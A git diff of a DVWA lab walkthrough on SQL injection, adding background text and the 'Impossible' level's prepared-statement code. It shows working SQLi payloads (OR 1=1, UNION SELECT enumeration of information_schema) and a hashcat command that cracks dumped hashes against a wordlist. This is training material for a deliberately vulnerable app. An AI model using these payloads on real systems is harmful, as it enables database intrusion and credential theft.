@@ -1,4 +1,14 @@
 # SQL Injection
+
+## About
+```
+A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.
+A successful SQL injection exploit can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system (load_file) and in some cases issue commands to the operating system.
+SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.
+This attack may also be called "SQLi".
+```
+Source: DVWA Documentation
+
 ## Low Security
 
 <p align="center">
@@ -20,7 +30,10 @@ while( $row = mysqli_fetch_assoc( $result ) ) {
     $last  = $row["last_name"];
 
     // Feedback for end user
-    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
+    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+}
+
+mysqli_close($GLOBALS["___mysqli_ston"]); 
 ```
 
 We can see that the `'$id'` is not validated or sanitized in any way, so we can inject the following: `1' OR 1=1;#`
@@ -29,17 +42,17 @@ We can see that the `'$id'` is not validated or sanitized in any way, so we can 
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql2.png?raw=true">
 </p>
 
-With this payload we bypass the query using the quote symbol and add the logic operator `OR`, which will make the query to choose between the id given or a true statement such as 1=1.
+With this payload we bypass the query using the quote symbol and add the logic operator `OR`, which will make the query to return between the id given or a true statement such as 1=1.
 The pound sign `#` is used to comment the rest of the query.
 
 So, the query executed will look like this:
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1;#;"
+SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1;#';"
 ```
 
 To further exploit this vulnerability we can use the UNION method to extract more information:
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT @@version, null#;"
+SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT @@version, null#';"
 ```
 
 <p align="center">
@@ -47,7 +60,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT @@versi
 </p>
 
 Now we got the version of the database.
-First, we need to enumerate the columns using `UNION SELECT null,null`, and we add null values until we will get a valid response.
+First, we need to enumerate the columns using `UNION SELECT null,null`, and we add null values until we will get a valid response. This is usually done to enumerate the number of columns returned, but in this case we already know that `first_name` and `last_name` are returned.
 Keep in mind that `@@version` syntax will only work for MySQL dbs.
 
 Using `database()` function we can find the name of the database.
@@ -57,7 +70,7 @@ Using `database()` function we can find the name of the database.
 </p>
 
 Now we can enumerate the tables, the columns and extract the values.
-For the next queries I changed the syntax a little bit.	
+For the next queries I changed the format a little bit.	
 
 ```sql
 1' UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa'#
@@ -103,7 +116,13 @@ hashcat -m 0 password /usr/share/wordlists/rockyou.txt
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql3.png?raw=true">
 </p>
 
-For the Medium security level we can not change the value of the parameter directly from the UI, but we can use a Proxy tool like Burp Suite to modify the HTTP request.
+For the Medium security level we can not change the value of the parameter directly from the UI, but we can edit it with the Inspect Element option.
+
+<p align="center">
+  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql15.png?raw=true">
+</p>
+
+Another method is to use a Proxy tool like Burp Suite to modify the HTTP request.
 
 <p align="center">
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql4.png?raw=true">
@@ -189,3 +208,43 @@ In this case, the same payloads will work for High security level.
 </p>
 
 ## Impossible Security
+
+Source Code:
+```php
+<?php
+
+if( isset( $_GET[ 'Submit' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $id = $_GET[ 'id' ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        $id = intval ($id);
+        // Check the database
+        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+        $data->bindParam( ':id', $id, PDO::PARAM_INT );
+        $data->execute();
+        $row = $data->fetch();
+		
+        // Make sure only 1 result is returned
+        if( $data->rowCount() == 1 ) {
+            // Get values
+            $first = $row[ 'first_name' ];
+            $last  = $row[ 'last_name' ];
+		
+            // Feedback for end user
+            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?> 
+```
+
+For this case, an Anti-CSRF token was implemented, and the application verifies if the `$id` has a numerical value.
